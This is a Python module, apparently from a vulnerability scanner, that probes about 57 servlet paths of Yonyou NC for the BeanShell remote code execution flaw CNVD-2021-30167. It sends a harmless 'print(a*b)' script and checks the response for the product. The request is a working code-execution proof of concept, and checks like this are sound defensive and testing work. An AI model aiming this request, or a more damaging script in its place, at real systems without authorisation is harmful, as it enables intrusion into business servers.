#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_int_2

cnvd_2021_30167_payloads = [
    {
        'path': 'servlet/~ic/bsh.servlet.BshServlet',
        # 'data': 'bsh.script=print%28{}*{}%29%3B'.format(randomNum_1, randomNum_2)
    },
    {'path': 'service/~aim/bsh.servlet.BshServlet'},
    {'path': 'service/~alm/bsh.servlet.BshServlet'},
    {'path': 'service/~ampub/bsh.servlet.BshServlet'},
    {'path': 'service/~arap/bsh.servlet.BshServlet'},
    {'path': 'service/~aum/bsh.servlet.BshServlet'},
    {'path': 'service/~cc/bsh.servlet.BshServlet'},
    {'path': 'service/~cdm/bsh.servlet.BshServlet'},
    {'path': 'service/~cmp/bsh.servlet.BshServlet'},
    {'path': 'service/~ct/bsh.servlet.BshServlet'},
    {'path': 'service/~dm/bsh.servlet.BshServlet'},
    {'path': 'service/~erm/bsh.servlet.BshServlet'},
    {'path': 'service/~fa/bsh.servlet.BshServlet'},
    {'path': 'service/~fac/bsh.servlet.BshServlet'},
    {'path': 'service/~fbm/bsh.servlet.BshServlet'},
    {'path': 'service/~ff/bsh.servlet.BshServlet'},
    {'path': 'service/~fip/bsh.servlet.BshServlet'},
    {'path': 'service/~fipub/bsh.servlet.BshServlet'},
    {'path': 'service/~fp/bsh.servlet.BshServlet'},
    {'path': 'service/~fts/bsh.servlet.BshServlet'},
    {'path': 'service/~fvm/bsh.servlet.BshServlet'},
    {'path': 'service/~gl/bsh.servlet.BshServlet'},
    {'path': 'service/~hrhi/bsh.servlet.BshServlet'},
    {'path': 'service/~hrjf/bsh.servlet.BshServlet'},
    {'path': 'service/~hrpd/bsh.servlet.BshServlet'},
    {'path': 'service/~hrpub/bsh.servlet.BshServlet'},
    {'path': 'service/~hrtrn/bsh.servlet.BshServlet'},
    {'path': 'service/~hrwa/bsh.servlet.BshServlet'},
    {'path': 'service/~ia/bsh.servlet.BshServlet'},
    {'path': 'service/~ic/bsh.servlet.BshServlet'},
    {'path': 'service/~iufo/bsh.servlet.BshServlet'},
    {'path': 'service/~modules/bsh.servlet.BshServlet'},
    {'path': 'service/~mpp/bsh.servlet.BshServlet'},
    {'path': 'service/~obm/bsh.servlet.BshServlet'},
    {'path': 'service/~pu/bsh.servlet.BshServlet'},
    {'path': 'service/~qc/bsh.servlet.BshServlet'},
    {'path': 'service/~sc/bsh.servlet.BshServlet'},
    {'path': 'service/~scmpub/bsh.servlet.BshServlet'},
    {'path': 'service/~so/bsh.servlet.BshServlet'},
    {'path': 'service/~so2/bsh.servlet.BshServlet'},
    {'path': 'service/~so3/bsh.servlet.BshServlet'},
    {'path': 'service/~so4/bsh.servlet.BshServlet'},
    {'path': 'service/~so5/bsh.servlet.BshServlet'},
    {'path': 'service/~so6/bsh.servlet.BshServlet'},
    {'path': 'service/~tam/bsh.servlet.BshServlet'},
    {'path': 'service/~tbb/bsh.servlet.BshServlet'},
    {'path': 'service/~to/bsh.servlet.BshServlet'},
    {'path': 'service/~uap/bsh.servlet.BshServlet'},
    {'path': 'service/~uapbd/bsh.servlet.BshServlet'},
    {'path': 'service/~uapde/bsh.servlet.BshServlet'},
    {'path': 'service/~uapeai/bsh.servlet.BshServlet'},
    {'path': 'service/~uapother/bsh.servlet.BshServlet'},
    {'path': 'service/~uapqe/bsh.servlet.BshServlet'},
    {'path': 'service/~uapweb/bsh.servlet.BshServlet'},
    {'path': 'service/~uapws/bsh.servlet.BshServlet'},
    {'path': 'service/~vrm/bsh.servlet.BshServlet'},
    {'path': 'service/~yer/bsh.servlet.BshServlet'},
]

def cnvd_2021_30167_scan(clients):
    ''' 用友NC BeanShell远程命令执行漏洞
            给了一个命令执行的页面, 在框框内输入命令, 然后点击按钮就可以运行任意代码
    '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': 'Yonyou-NC',
        'vul_type': 'RCE',
        'vul_id': 'CNVD-2021-30167',
    }
    
    baseData = 'bsh.script=print%28{}*{}%29%3B'

    for payload in cnvd_2021_30167_payloads:
        randomNum_1, randomNum_2 = random_int_2()
        
        path = payload['path']
        data = baseData.format(randomNum_1, randomNum_2)

        res = client.request(
            'post',
            path,
            data=data,
            vul_info=vul_info
        )
        if res is None:
            continue

        randomNum_sum = str(randomNum_1 * randomNum_2)
        if (randomNum_sum in res.text):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
